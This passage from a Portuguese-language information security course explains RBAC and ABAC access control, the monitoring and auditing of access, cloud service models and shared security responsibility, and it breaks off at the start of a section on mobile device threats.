possibilidade de acessos inadequados. 
Limitações do RBAC: 
• 
Rigidez: O RBAC pode ser limitado em ambientes onde as funções dos 
usuários não seguem uma estrutura clara ou fixa, e onde as permissões 
precisam ser altamente específicas. 

 
 
• 
Gerenciamento de Exceções: Em situações em que um usuário precisa 
de permissões que fogem de seu papel habitual, o RBAC pode exigir a 
criação de novos papéis ou permissões temporárias, o que pode se tornar 
complexo. 
 
2. Controle de Acesso Baseado em Atributos (ABAC) 
O ABAC (Attribute-Based Access Control), ou Controle de Acesso Baseado 
em Atributos, é um modelo mais flexível e dinâmico, no qual as permissões de 
acesso são concedidas com base em atributos específicos, em vez de papéis 
predefinidos. Esses atributos podem ser relacionados ao usuário, ao recurso ao 
qual ele deseja acessar ou ao ambiente em que o acesso está sendo solicitado. 
Como Funciona: 
• 
Atributos de Usuários: Podem incluir informações como cargo, 
departamento, localização, nível de segurança, ou mesmo características 
pessoais como idade ou status de emprego. 
• 
Atributos de Recursos: Refletem as características do recurso que está 
sendo acessado, como o tipo de dado, o nível de confidencialidade ou a 
categoria de um arquivo. 
• 
Atributos de Ambiente: Consideram o contexto do acesso, como o 
horário do dia, a localização geográfica, o tipo de dispositivo usado para 
acessar, ou até mesmo a rede na qual o usuário está conectado. 
• 
Políticas de Acesso: São criadas com base em combinações de 
atributos. Um usuário só terá permissão para acessar um recurso se seus 
atributos atenderem aos critérios definidos na política. 
Exemplo Prático: 
Em uma organização que usa o ABAC, um gerente de vendas pode acessar 
relatórios financeiros se: 
• 
Ele estiver no departamento de vendas (atributo de usuário), 
• 
O relatório for classificado como recurso de nível confidencial (atributo 
do recurso), 
• 
Ele estiver acessando de um dispositivo autorizado (atributo de 
ambiente), 
• 
Durante o horário comercial (atributo de ambiente). 
Nesse exemplo, se o gerente tentar acessar o relatório fora do horário de 
trabalho, ou de um dispositivo não autorizado, o acesso será negado, mesmo 
que ele tenha a função de gerente. 
Vantagens do ABAC: 
• 
Alta Flexibilidade: Permite a criação de políticas de acesso muito 
detalhadas e específicas, com base em uma ampla variedade de 
atributos. 
• 
Granularidade de Controle: Como o ABAC permite definir políticas com 
base em múltiplos fatores, ele oferece um controle mais refinado sobre 
quem pode acessar o quê e em quais circunstâncias. 
• 
Aplicação em Ambientes Dinâmicos: O ABAC é ideal para cenários em 
que as funções dos usuários mudam frequentemente ou onde o contexto 
do acesso (como localização ou horário) é importante. 
Limitações do ABAC: 
• 
Complexidade de Implementação: Devido à sua flexibilidade, o ABAC 
pode ser mais difícil de configurar e manter, exigindo a definição de 
políticas complexas. 

 
 
• 
Sobrecarga Computacional: A avaliação de múltiplos atributos pode 
demandar mais processamento, especialmente em ambientes com 
grande volume de acessos e políticas complexas. 
 
Comparação entre RBAC e ABAC 
 
Aspecto 
RBAC  
(Controle de Acesso 
Baseado em Papéis) 
ABAC  
(Controle de Acesso 
Baseado em Atributos) 
Base de controle 
Permissões são 
atribuídas com base em 
papéis predefinidos 
Permissões são concedidas 
com base em atributos 
dinâmicos 
Flexibilidade 
Menos flexível, pois as 
permissões são 
vinculadas a papéis fixos 
Altamente flexível, com base 
em atributos de usuário, 
recurso e ambiente 
Facilidade de 
implementação 
Mais fácil de 
implementar, 
especialmente em 
organizações com 
funções claras 
Mais complexo, pois exige 
definição de políticas com 
múltiplos atributos 
Granularidade 
Controle mais geral, 
limitado aos papéis 
Controle muito mais 
granular, permitindo políticas 
detalhadas 
Exemplos de uso 
Organizações com 
hierarquias bem definidas 
(ex: militares, hospitais 
etc.) 
Organizações com cenários 
dinâmicos e variáveis (ex: 
bancos, empresas com 
funcionários remotos) 
 
TABELA 2 – Tabela com resumo das principais características de modelo de 
acesso baseado em papéis e modelo de acesso baseado em atributos. 
  
Quando Usar RBAC e Quando Usar ABAC? 
• 
RBAC é ideal para organizações onde as funções dos usuários são claras 
e não mudam com frequência. Por exemplo, empresas com estruturas 
hierárquicas fixas ou ambientes que exigem regras de acesso 
padronizadas para grupos de usuários podem se beneficiar da 
simplicidade do RBAC. 
Exemplo de Uso: Uma escola que tem professores, alunos e administradores 
pode usar RBAC para conceder acesso diferenciado, garantindo que 
professores possam editar notas, alunos possam apenas visualizar e 
administradores tenham permissões adicionais. 
• 
ABAC é mais apropriado em cenários onde há variáveis dinâmicas que 
precisam ser consideradas no controle de acesso, como localização, 
dispositivos ou horário. Empresas com um ambiente de trabalho 
dinâmico, onde as funções dos usuários mudam frequentemente, ou onde 
o contexto do acesso é importante, podem preferir o ABAC pela 
flexibilidade e controle granular que ele oferece. 
Exemplo de Uso: Uma empresa multinacional que permite acesso remoto para 
seus funcionários pode usar ABAC para garantir que os funcionários só possam 

 
 
acessar determinados sistemas se estiverem conectados de um dispositivo 
autorizado e dentro do horário de trabalho. 
 
Tanto o RBAC quanto o ABAC são modelos eficazes de controle de acesso, 
mas cada um atende a diferentes necessidades organizacionais. O RBAC é mais 
simples de implementar e é ideal para organizações com estruturas de função 
estáveis, enquanto o ABAC oferece maior flexibilidade e controle, sendo ideal 
para ambientes dinâmicos onde o contexto e os atributos individuais 
desempenham um papel crucial. A escolha entre RBAC e ABAC depende das 
necessidades de segurança e da complexidade da infraestrutura de TI da 
organização, sendo possível, inclusive, combinar ambos para obter uma solução 
de controle de acesso ainda mais robusta. 
 
4.3. MONITORAMENTO E AUDITORIA DE ACESSOS 
 
Monitoramento e auditoria de acessos são processos críticos dentro de uma 
estratégia de segurança da informação. Eles envolvem o registro, o 
acompanhamento e a análise de todas as atividades de acesso a sistemas, 
redes e dados. O objetivo principal é garantir que somente usuários autorizados 
estejam acessando os recursos corretos, além de identificar e responder a 
comportamentos anômalos ou tentativas de acesso não autorizadas. Esses 
processos também são fundamentais para garantir conformidade com 
regulamentações e auditorias de segurança. 
A seguir, vamos explorar o conceito de monitoramento e auditoria de acessos, 
sua importância, exemplos práticos e como eles se encaixam em uma 
abordagem ampla de segurança. 
 
1. Monitoramento de Acessos 
O monitoramento de acessos consiste na observação contínua das atividades 
de usuários dentro de sistemas e redes. Isso inclui o registro de logins, 
alterações de permissões, transferências de dados, entre outras ações que 
envolvem a autenticação e o uso de recursos. O objetivo é detectar em tempo 
real quaisquer atividades suspeitas ou violações das políticas de segurança, 
permitindo uma resposta rápida a incidentes. 
Importância do Monitoramento de Acessos: 
• 
Detecção de Atividades Suspeitas: Com o monitoramento, é possível 
identificar acessos anômalos ou não autorizados, como tentativas de login 
de endereços IP incomuns ou acessos fora do horário de trabalho. 
• 
Proteção contra Ameaças Internas: O monitoramento ajuda a identificar 
abusos de privilégios por funcionários ou usuários internos, um risco 
significativo em muitas organizações. 
• 
Prevenção de Incidentes: O monitoramento contínuo permite ações 
preventivas, como a suspensão automática de acessos em caso de 
tentativas de invasão ou comportamento fora do padrão. 
Exemplo Prático: 
Uma organização que utiliza monitoramento de acessos pode configurar 
alertas automáticos para quando um usuário tenta acessar um sistema crítico 
fora do horário de expediente ou a partir de um dispositivo não autorizado. Se 
um comportamento anômalo for detectado, uma equipe de segurança pode ser 
notificada para investigar. 
Ferramentas de Monitoramento: 

 
 
• 
SIEM (Security Information and Event Management): Sistemas SIEM 
agregam e analisam logs e eventos de diferentes fontes, fornecendo 
visibilidade centralizada sobre a atividade na rede. 
• 
Firewalls e IPS: Essas tecnologias de segurança também monitoram 
tentativas de acesso e podem bloquear tráfego malicioso ou suspeito. 
 
2. Auditoria de Acessos 
A auditoria de acessos é um processo formal que revisa e examina os registros 
de acessos para verificar se eles estão de acordo com as políticas de segurança 
e regulamentações. Enquanto o monitoramento é uma atividade contínua e em 
tempo real, a auditoria é um processo periódico ou reativo, que verifica se os 
acessos realizados estão em conformidade com as regras estabelecidas e se 
houve algum tipo de desvio que possa ter comprometido a segurança. 
Importância da Auditoria de Acessos: 
• 
Conformidade com Regulamentações: Muitas regulamentações de 
proteção de dados, como a LGPD (Lei Geral de Proteção de Dados) e 
o GDPR (General Data Protection Regulation), exigem que as 
organizações realizem auditorias regulares para garantir que os dados 
pessoais estejam sendo acessados apenas por pessoas autorizadas. 
• 
Identificação de Padrões de Abuso: A auditoria pode identificar padrões 
de acessos indevidos, como usuários que repetidamente tentam acessar 
sistemas para os quais não têm permissão. 
• 
Revisão de Privilégios: As auditorias verificam se os privilégios de 
acesso estão corretos e se não há funcionários com acesso 
desnecessário ou excessivo a determinados recursos. 
• 
Documentação para Investigações: Em caso de incidentes de 
segurança, 
as 
auditorias 
fornecem 
uma 
trilha 
de 
evidências 
documentadas que podem ser usadas em investigações e para 
responsabilização. 
Exemplo Prático: 
Uma empresa de saúde que armazena dados de pacientes deve realizar 
auditorias de acesso regulares para garantir que apenas os médicos e 
profissionais autorizados tenham acessado os prontuários eletrônicos dos 
pacientes. Se um acesso não autorizado for detectado durante a auditoria, a 
organização pode tomar medidas para reforçar os controles. 
Ferramentas de Auditoria: 
• 
Auditoria de Logs: Ferramentas especializadas permitem que as 
organizações revisem e analisem os registros de logins, alterações de 
privilégios e tentativas de acesso falhas. Isso inclui soluções integradas 
em sistemas operacionais ou ferramentas de segurança específicas. 
• 
Soluções de IAM (Identity and Access Management): Ferramentas de 
IAM geralmente incluem funções de auditoria que permitem rastrear as 
permissões concedidas e garantir que estejam de acordo com as políticas 
internas e regulamentações. 
 
3. Diferença entre Monitoramento e Auditoria de Acessos 
Embora 
monitoramento 
e 
auditoria 
de 
acessos 
sejam 
processos 
complementares, eles têm diferenças importantes: 
 
 
 

 
 
Aspecto 
Monitoramento de acessos Auditoria de acessos 
Objetivo 
Detectar atividades 
suspeitas em tempo real 
Verificar conformidade com 
políticas e regulamentações 
Frequência 
Continuo e em tempo real 
Periódico ou reativo (ex: após 
um incidente) 
Foco 
Identificar atividades 
anômalas e prevenir 
incidentes 
Revisar atividades passadas e 
garantir conformidade 
Ferramentas SIEM, firewalls, IDS/IPS 
Ferramentas de auditoria. de 
logs, IAM, soluções de DLP. 
 
Tabela 3 – Características comparativas entre monitoramento e auditoria de 
acessos em contextos envolvendo IAM 
 
4. Monitoramento e Auditoria no Contexto da Conformidade 
As auditorias e o monitoramento de acessos desempenham um papel essencial 
no cumprimento de diversas regulamentações de segurança de dados, como a 
LGPD (Lei Geral de Proteção de Dados), GDPR (General Data Protection 
Regulation) e outras normas de segurança, como a ISO 27001. Muitas dessas 
leis e regulamentações exigem que as organizações mantenham trilhas de 
auditoria detalhadas e possam comprovar que apenas usuários autorizados 
acessaram dados confidenciais. 
Exemplos de Conformidade: 
• 
LGPD e Auditoria: No Brasil, a LGPD exige que as organizações 
protejam dados pessoais e controlem quem pode acessá-los. Auditorias 
periódicas ajudam a garantir que apenas pessoas autorizadas estão 
acessando os dados sensíveis dos clientes e funcionários. 
• 
ISO 27001: A norma ISO 27001, que define boas práticas para sistemas 
de gestão de segurança da informação, exige que as organizações 
realizem auditorias regulares e mantenham registros detalhados de 
acessos a sistemas críticos. 
 
5. Desafios e Boas Práticas no Monitoramento e Auditoria de Acessos 
Desafios: 
• 
Volume de Dados: Monitorar e auditar grandes volumes de logs pode ser 
um desafio, especialmente em grandes organizações com milhares de 
usuários e dispositivos. 
• 
Automação: As organizações muitas vezes enfrentam dificuldades para 
automatizar o processo de auditoria e garantir que todos os eventos 
relevantes sejam capturados de forma eficaz. 
• 
Falsos Positivos: O monitoramento em tempo real pode gerar muitos 
alertas, o que pode sobrecarregar as equipes de segurança e dificultar a 
identificação de ameaças reais. 
Boas Práticas: 
• 
Definir Políticas Claras de Acesso: Garantir que as políticas de acesso 
sejam bem definidas, com base no princípio do menor privilégio, para 
reduzir o risco de acessos não autorizados. 
• 
Usar Ferramentas de SIEM e IAM: Ferramentas de SIEM e IAM ajudam 
a centralizar e automatizar o monitoramento e auditoria, facilitando a 
análise de eventos e a geração de relatórios. 

 
 
• 
Auditorias Regulares: Realizar auditorias regulares, com uma revisão 
detalhada de todos os registros de acessos críticos, para garantir a 
conformidade contínua e identificar potenciais brechas de segurança. 
• 
Responder a Incidentes de Acesso: Implementar um processo claro 
para responder a incidentes de acesso, como bloqueio de usuários ou 
revisão de permissões em caso de atividade suspeita. 
 
Monitoramento e auditoria de acessos são essenciais para garantir a 
segurança e a conformidade das organizações em relação aos dados e sistemas 
críticos. O monitoramento atua como um sistema de defesa proativa, 
identificando atividades suspeitas em tempo real, enquanto a auditoria fornece 
uma revisão detalhada e retrospectiva, ajudando a garantir que as políticas de 
segurança estão sendo cumpridas. Juntos, eles formam uma estratégia robusta 
de proteção, minimizando o risco de acessos não autorizados e assegurando 
que as organizações estejam alinhadas com as melhores práticas de segurança 
da informação e as regulamentações de conformidade. 
 
 

 
 
UNIDADE 5 SEGURANÇA EM CENÁRIOS DESCENTRALIZADOS 
 
Nesta unidade, vamos entender a responsabilidade compartilhada de 
segurança entre provedor e cliente. Mas para entender isso, é importante 
também entender como são os modelos de serviço de cloud, como por 
exemplo: SaaS, PaaS e IaaS. Um outro cenário que requer atenção dos 
profissionais de segurança, são os que envolvem dispositivos mobile, onde é 
complexa a implementação da segurança já que estamos lidando muitas vezes 
com dispositivos não gerenciados 100% pela empresa. Finalizamos esta 
unidade com reflexão sobre como fazer segurança em ambientes multi-cloud e 
BYOD. 
 
OBJETIVOS DA UNIDADE 5 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Saber diferenciar modelos de serviço em cloud 
 
• Compreender as responsabilidades compartilhadas de segurança em 
cloud 
 
• Gerenciar minimamente dispositivos móveis 
 
• Aplicar boas práticas de segurança em ambientes descentralizados 
 
 
 

 
 
5.1. INTRODUÇÃO À CLOUD COMPUTING: MODELOS DE SERVIÇO (IAAS, 
PAAS, SAAS) 
 
Cloud Computing, ou computação em nuvem, refere-se à entrega de serviços 
de computação — como servidores, armazenamento, redes, software e banco 
de dados — pela internet, permitindo que as organizações acessem esses 
recursos sob demanda, sem a necessidade de manter infraestrutura física 
complexa e cara. A computação em nuvem é altamente escalável e oferece 
flexibilidade e economia de custos, já que os serviços podem ser adquiridos e 
ajustados conforme a demanda. 
Existem três principais modelos de serviço em Cloud Computing, cada um 
oferecendo diferentes níveis de controle, flexibilidade e gerenciamento: IaaS 
(Infrastructure as a Service), PaaS (Platform as a Service) e SaaS (Software 
as a Service). Vamos entender cada um deles em detalhes. 
 
1. IaaS (Infrastructure as a Service) 
 
IaaS (Infrastructure as a Service), ou Infraestrutura como Serviço, é o 
modelo de computação em nuvem que fornece aos usuários acesso a recursos 
fundamentais de TI, como servidores virtuais, redes, armazenamento e sistemas 
operacionais, tudo isso pela internet. No IaaS, o provedor de nuvem oferece a 
infraestrutura física e virtual, enquanto o cliente é responsável pela gestão de 
suas próprias aplicações, dados e ambientes operacionais. 
 
Características do IaaS: 
• 
Gerenciamento pelo Cliente: O cliente gerencia o sistema operacional, 
os aplicativos, o middleware e os dados, enquanto o provedor gerencia o 
hardware subjacente, redes e armazenamento. 
• 
Recursos Sob Demanda: Os recursos podem ser provisionados e 
ajustados de acordo com a necessidade, permitindo escalabilidade. 
• 
Controle Completo: O cliente tem um alto nível de controle sobre a 
infraestrutura e o ambiente de desenvolvimento. 
 
Exemplo de Uso: 
Imagine que uma startup precisa de uma infraestrutura robusta para hospedar 
seu aplicativo web. Em vez de comprar e manter servidores físicos, a empresa 
contrata um serviço de IaaS, como o Amazon Web Services (AWS) ou 
Microsoft Azure, para configurar servidores virtuais, adicionar armazenamento 
e gerenciar redes, pagando apenas pelo uso real desses recursos. 
 
Benefícios do IaaS: 
• 
Escalabilidade: A capacidade de aumentar ou diminuir recursos 
conforme necessário. 
• 
Redução de Custos: Elimina a necessidade de comprar e manter 
hardware físico. 
• 
Flexibilidade: As organizações têm total controle sobre a infraestrutura, 
podendo instalar e configurar o que for necessário. 
 
2. PaaS (Platform as a Service) 
 

 
 
PaaS (Platform as a Service), ou Plataforma como Serviço, é um modelo de 
nuvem 
onde 
os 
provedores 
oferecem 
um 
ambiente 
completo 
de 
desenvolvimento e implementação, que inclui ferramentas, middleware, 
sistemas operacionais e infraestrutura. O cliente usa o PaaS para desenvolver, 
testar, gerenciar e implementar suas aplicações sem se preocupar com o 
gerenciamento do hardware subjacente ou da infraestrutura. 
 
Características do PaaS: 
• 
Ambiente de Desenvolvimento Gerenciado: Os provedores oferecem 
uma plataforma pronta para uso, onde os desenvolvedores podem criar e 
testar aplicativos sem gerenciar servidores ou sistemas operacionais. 
• 
Automação de Tarefas: PaaS facilita o gerenciamento de tarefas como 
provisionamento de servidores, balanceamento de carga e escalabilidade 
automática. 
• 
Foco no Desenvolvimento: O cliente foca no desenvolvimento e 
implementação de seus aplicativos, enquanto o provedor gerencia a 
infraestrutura. 
 
Exemplo de Uso: 
Uma equipe de desenvolvedores de uma empresa precisa criar e lançar 
rapidamente um novo aplicativo. Em vez de configurar servidores e instalar todas 
as ferramentas de desenvolvimento, eles usam uma plataforma PaaS como 
Heroku ou Google App Engine. A plataforma já fornece todo o ambiente 
necessário, como servidores web, bancos de dados e ferramentas de 
desenvolvimento, permitindo que os desenvolvedores foquem apenas no código. 
 
Benefícios do PaaS: 
• 
Aceleração do Desenvolvimento: A plataforma facilita e acelera o 
desenvolvimento e a implementação de aplicações. 
• 
Manutenção Reduzida: O provedor cuida de toda a manutenção da 
infraestrutura e do ambiente, como atualizações e patches. 
• 
Colaboração Facilitada: Permite que equipes de desenvolvimento 
colaborem de forma eficiente em um ambiente compartilhado. 
 
3. SaaS (Software as a Service) 
SaaS (Software as a Service), ou Software como Serviço, é o modelo de 
nuvem em que o software é disponibilizado diretamente pela internet como um 
serviço, sem necessidade de instalação ou gerenciamento por parte do cliente. 
Tudo — desde a infraestrutura até o software — é gerenciado pelo provedor de 
serviços, e os usuários acessam as aplicações por meio de um navegador da 
web. 
 
Características do SaaS: 
• 
Aplicações Gerenciadas pelo Provedor: O provedor gerencia 
completamente a aplicação, incluindo infraestrutura, segurança e 
manutenção. 
• 
Acesso via Internet: Os usuários acessam o software por meio de um 
navegador web ou aplicativo dedicado, sem precisar instalar ou manter o 
software localmente. 

 
 
• 
Atualizações Automáticas: O provedor é responsável por todas as 
atualizações 
e 
melhorias 
do 
software, 
que 
são 
aplicadas 
automaticamente. 
 
Exemplo de Uso: 
Uma empresa precisa de um sistema de CRM (Customer Relationship 
Management) para gerenciar suas interações com os clientes. Em vez de 
desenvolver ou instalar um software local, a empresa opta por usar um serviço 
SaaS como o Salesforce ou Zendesk. Os funcionários acessam o CRM 
diretamente pela internet e todas as funcionalidades e atualizações são 
gerenciadas pelo provedor. 
 
Benefícios do SaaS: 
• 
Facilidade de Uso: Os usuários não precisam instalar ou gerenciar o 
software; tudo é feito pelo provedor. 
• 
Atualizações Automáticas: Os usuários sempre têm acesso à versão 
mais recente do software, sem a necessidade de intervenções manuais. 
• 
Acessibilidade: O software pode ser acessado de qualquer lugar com 
uma conexão à internet, facilitando o trabalho remoto. 
 
 
Comparação dos Modelos de Serviço (IaaS, PaaS, SaaS) 
 
Aspecto 
IaaS 
PaaS 
SaaS 
Controle 
Controle completo 
da infraestrutura, 
servidores, rede, 
armazenamento 
Controle limitado ao 
desenvolvimento e 
implementação de 
aplicativos 
Pouco ou 
nenhum 
controle sobre a 
infraestrutura e 
o software 
Gerenciamento 
O cliente gerencia 
o sistema 
operacional, 
aplicativos, 
middleware e 
dados 
O provedor 
gerencia a 
infraestrutura e o 
cliente gerencia as 
aplicações 
O provedor 
gerencia tudo, 
desde a infra ao 
software 
Casos de uso 
Empresas que 
precisam de 
controle total 
sobre ambientes 
e recursos 
Empresas que 
desejam focar no 
desenvolvimento de 
aplicativos sem se 
preocupar com a 
infraestrutura 
Usuários que 
precisam de um 
software 
específico sem 
lidar com 
instalação ou 
manutenção 
Exemplos de 
provedores 
AWS, MS Azure, 
GCP 
Heroku, Google 
App Engine, Azure 
App Services 
Google 
Workspace, 
Salesforce, 
Office 365 
 
Tabela 4 – Tabela comparativa dos modelos de serviço ofertados em cloud 
 
Escolhendo o Modelo Certo 

 
 
 
A escolha entre IaaS, PaaS e SaaS depende das necessidades específicas de 
cada organização: 
• 
IaaS é ideal para empresas que precisam de controle total sobre sua 
infraestrutura, como desenvolvedores que desejam gerenciar seus 
próprios servidores e redes. 
• 
PaaS é mais adequado para empresas que desejam focar no 
desenvolvimento e implementação de aplicativos sem lidar com a 
complexidade de gerenciar a infraestrutura subjacente. 
• 
SaaS é perfeito para organizações que precisam acessar aplicativos 
prontos e preferem não se preocupar com instalação, manutenção ou 
atualizações de software. 
 
A computação em nuvem revolucionou a forma como as empresas gerenciam 
suas operações de TI. Ao fornecer IaaS, PaaS e SaaS, os provedores de nuvem 
oferecem uma ampla gama de opções para organizações de todos os tamanhos. 
Cada modelo oferece diferentes níveis de controle e flexibilidade, permitindo que 
as empresas escolham a solução que melhor se adapta às suas necessidades 
de negócios. Com a nuvem, as organizações podem escalar seus recursos 
conforme necessário, reduzir custos operacionais e aumentar sua agilidade no 
desenvolvimento e implementação de soluções. 
 
5.2. RESPONSABILIDADES DE SEGURANÇA EM CLOUD COMPUTING 
 
Quando uma organização adota a computação em nuvem (Cloud Computing), 
ela transfere parte da responsabilidade pela infraestrutura de TI para o provedor 
de serviços em nuvem. No entanto, isso não significa que a segurança seja 
totalmente delegada ao provedor. A segurança na nuvem segue um modelo de 
responsabilidade compartilhada, onde tanto o provedor quanto o cliente têm 
papéis e responsabilidades específicos para garantir a proteção dos dados, 
sistemas e aplicações. 
 
Essa divisão de responsabilidades varia de acordo com o modelo de serviço 
em nuvem (IaaS, PaaS, SaaS) adotado pela organização. A seguir, vamos 
explorar em detalhes como essas responsabilidades são distribuídas entre 
provedores e clientes, e as principais práticas de segurança que devem ser 
seguidas. 
 
 
 
 
 
 
 
 
 
 
 
 
 
1. Modelo de Responsabilidade Compartilhada 

 
 
 
O modelo de responsabilidade compartilhada é um conceito chave em 
segurança na nuvem, onde a responsabilidade pela proteção dos recursos é 
dividida entre o provedor de serviços e o cliente, dependendo de qual parte do 
ambiente está sendo gerenciada por quem. 
O Provedor de Serviços em Nuvem é responsável por: 
Segurança da Nuvem: O provedor é responsável por proteger a infraestrutura 
subjacente que inclui hardware, software, redes e instalações onde os serviços 
de nuvem são executados. 
O Cliente (Organização) é responsável por: 
Segurança na Nuvem: O cliente é responsável por gerenciar e proteger seus 
próprios dados, aplicativos e configurações dentro da nuvem. 
 
Responsabilidades com base nos modelos de serviço 
 
Modelo de 
Serviço 
Responsabilidade do 
provedor de nuvem 
Responsabilidade do 
cliente 
IaaS 
Infraestrutura física 
(servidores, rede, 
armazenamento), segurança 
física e virtual de 
infraestrutura 
Sistema operacional, 
aplicações, dados, 
gerenciamento de 
usuários, segurança de 
rede virtual 
PaaS 
Infraestrutura, sistema 
operacional, plataforma de 
desenvolvimento, 
atualizações e patches da 
plataforma 
Aplicações, dados, 
gerenciamento de 
usuários, configurações de 
segurança das aplicações 
SaaS 
Toda a infraestrutura, 
plataforma, aplicativos e 
manutenção (patches e 
atualizações) 
Segurança dos dados do 
cliente, controle de acesso 
e gerenciamento de 
identidades (IAM) 
 
Tabela 5 – Responsabilidades do provedor x cliente conforme o modelo de 
serviço em nuvem 
 
2. Responsabilidades de Segurança do Provedor de Nuvem 
 
O provedor de serviços em nuvem tem a responsabilidade de garantir que a 
infraestrutura subjacente à nuvem seja segura. Isso inclui a segurança física 
dos data centers, a proteção contra ameaças na rede e a aplicação de medidas 
de segurança no nível da infraestrutura. 
 
Principais Responsabilidades do Provedor de Nuvem: 
Segurança Física dos Data Centers: Garantir que as instalações físicas onde 
os servidores da nuvem estão localizados estejam protegidas contra ameaças 
como invasões, desastres naturais e falhas de energia. 
Segurança de Rede: Implementar firewalls, sistemas de detecção e prevenção 
de intrusões (IDS/IPS) e criptografia de rede para proteger os dados que 
trafegam entre os servidores do provedor e a internet. 

 
 
Gerenciamento de Patches e Atualizações: Aplicar atualizações de 
segurança regulares na infraestrutura de servidores, sistemas operacionais e 
plataformas de nuvem. 
Proteção Contra Ataques DDoS: Monitorar e mitigar ataques de negação de 
serviço distribuídos (DDoS) que possam afetar a disponibilidade dos serviços 
em nuvem. 
Segurança de Hypervisores: Proteger o hypervisor, que permite a 
virtualização de servidores e a execução de múltiplas máquinas virtuais, para 
evitar comprometimento da infraestrutura. 
 
Exemplo de Provedor de Nuvem: 
Um provedor de IaaS como o Amazon Web Services (AWS) é responsável 
pela segurança física dos data centers, proteção contra-ataques de rede e pela 
manutenção de toda a infraestrutura subjacente, como servidores e sistemas 
operacionais que os clientes utilizam para criar suas próprias instâncias 
virtuais. 
 
 

 
 
3. Responsabilidades de Segurança do Cliente 
 
As responsabilidades do cliente variam de acordo com o modelo de serviço 
utilizado, mas sempre incluem a segurança dos dados, a configuração de 
políticas de acesso e a proteção das aplicações implantadas na nuvem. 
 
Principais Responsabilidades do Cliente: 
Proteção de Dados: O cliente deve garantir que seus dados armazenados na 
nuvem estejam protegidos. Isso inclui o uso de criptografia para dados em 
trânsito e em repouso, além da implementação de backups regulares. 
Gerenciamento de Identidade e Acesso (IAM): O cliente deve controlar quem 
tem acesso aos dados e sistemas na nuvem. Isso inclui a criação de políticas 
de autenticação multifator (MFA) e o uso do princípio do menor privilégio, 
garantindo que os usuários tenham apenas o acesso necessário para realizar 
suas tarefas. 
Configurações de Segurança de Aplicações: Para os clientes de IaaS e 
PaaS, a segurança das aplicações implantadas na nuvem é uma 
responsabilidade do cliente. Isso inclui garantir que as aplicações estejam 
protegidas contra vulnerabilidades, como SQL injection ou cross-site 
scripting (XSS). 
Monitoração e Auditoria de Acessos: O cliente deve monitorar ativamente os 
acessos a seus sistemas e dados, além de realizar auditorias regulares para 
garantir que as políticas de segurança estejam sendo seguidas. 
Conformidade com Regulamentações: O cliente deve garantir que os dados 
armazenados na nuvem estejam em conformidade com regulamentações de 
privacidade e proteção de dados, como a LGPD (Lei Geral de Proteção de 
Dados) no Brasil ou o GDPR (General Data Protection Regulation) na 
Europa. 
 
Exemplo de Responsabilidade do Cliente: 
Uma empresa que utiliza o Microsoft Azure para hospedar seus aplicativos 
deve garantir que os dados dos clientes sejam criptografados tanto em trânsito 
quanto em repouso. Além disso, a empresa precisa configurar o controle de 
acesso adequado para limitar quem pode acessar esses dados e implementar 
autenticação multifator para todos os usuários. 
 
4. Boas Práticas de Segurança para Clientes na Nuvem 
Para garantir que as responsabilidades de segurança do cliente sejam 
atendidas de maneira eficaz, é fundamental adotar algumas boas práticas de 
segurança na nuvem: 
 
4.1. Criptografia de Dados 
Descrição: Utilizar criptografia para proteger dados sensíveis tanto em trânsito 
quanto em repouso, garantindo que eles não possam ser acessados ou 
interceptados por pessoas não autorizadas. 
Exemplo Prático: Uma empresa que armazena informações financeiras na 
nuvem deve garantir que todos os dados sejam criptografados usando 
protocolos como TLS para dados em trânsito e criptografia de discos para 
dados em repouso. 
4.2. Autenticação Multifator (MFA) 

 
 
Descrição: Implementar a autenticação multifator (MFA) para aumentar a 
segurança no acesso a sistemas e dados, exigindo que os usuários forneçam 
mais de uma prova de identidade (como uma senha e um código de 
verificação). 
Exemplo Prático: Uma empresa que permite que funcionários acessem dados 
críticos em uma instância IaaS pode configurar o MFA para garantir que, 
mesmo que uma senha seja comprometida, um segundo fator de autenticação 
ainda seja necessário. 
4.3. Gerenciamento de Privilégios 
Descrição: Seguir o princípio do menor privilégio, garantindo que os usuários 
tenham apenas as permissões necessárias para realizar suas tarefas, evitando 
que acessos excessivos comprometam a segurança. 
Exemplo Prático: Em um ambiente de desenvolvimento em PaaS, apenas os 
desenvolvedores devem ter acesso aos recursos de programação, enquanto as 
equipes de marketing não precisam acessar essas instâncias. 
4.4. Monitoramento Contínuo e Logs 
Descrição: Implementar ferramentas de monitoramento e logs de atividades 
para identificar comportamentos anômalos ou acessos não autorizados. Isso 
também inclui a configuração de alertas para atividades suspeitas. 
Exemplo Prático: Uma empresa que usa AWS pode configurar o CloudTrail 
para monitorar e registrar todas as atividades de API, garantindo que qualquer 
alteração ou acesso a recursos seja registrado e revisado. 
4.5. Conformidade e Auditoria Regular 
Descrição: Realizar auditorias de segurança e garantir que a infraestrutura em 
nuvem esteja em conformidade com regulamentações como a LGPD ou 
GDPR. 
Exemplo Prático: Uma organização que armazena dados de cidadãos 
europeus em um serviço de SaaS deve garantir que os dados estejam em 
conformidade com o GDPR, realizando auditorias regulares para monitorar o 
cumprimento das políticas de proteção de dados. 
 
A segurança em Cloud Computing é um esforço conjunto entre o provedor 
de serviços e o cliente, conforme definido pelo modelo de responsabilidade 
compartilhada. Embora o provedor seja responsável pela segurança da 
infraestrutura subjacente, cabe ao cliente gerenciar e proteger seus dados, 
aplicativos e acessos dentro desse ambiente. Adotar práticas de segurança 
adequadas, como criptografia de dados, autenticação multifator e 
monitoramento contínuo, é essencial para minimizar riscos e garantir que o 
ambiente de nuvem esteja seguro. 
 
5.3. GERENCIAMENTO DE SEGURANÇA EM DISPOSITIVOS MÓVEIS 
 
O gerenciamento de segurança em dispositivos móveis é um conjunto de 
práticas, políticas e tecnologias usadas para proteger smartphones, tablets e 
outros dispositivos móveis que acessam dados corporativos e redes. Com o 
aumento do uso de dispositivos móveis no ambiente de trabalho e a tendência 
de políticas como BYOD (Bring Your Own Device), a segurança desses 
dispositivos tornou-se uma prioridade fundamental para garantir a proteção de 
dados e a integridade dos sistemas corporativos. 
Dispositivos móveis, como smartphones e tablets, podem representar 
vulnerabilidades significativas se não forem devidamente gerenciados. Eles 

 
 
estão sujeitos a ameaças como perda ou roubo, malware móvel, redes inseguras 
e ataques de engenharia social, como phishing. O gerenciamento eficaz de 
segurança para esses dispositivos é essencial para mitigar esses riscos. 
 
1. Principais Ameaças à Segurança em Dispositivos Móveis 
 
Antes de explorar as práticas de gerenciamento, é importante entender as 
principais ameaças que afetam a segurança dos dispositivos móveis: 
 
1.1. Perda e Roubo 
• 
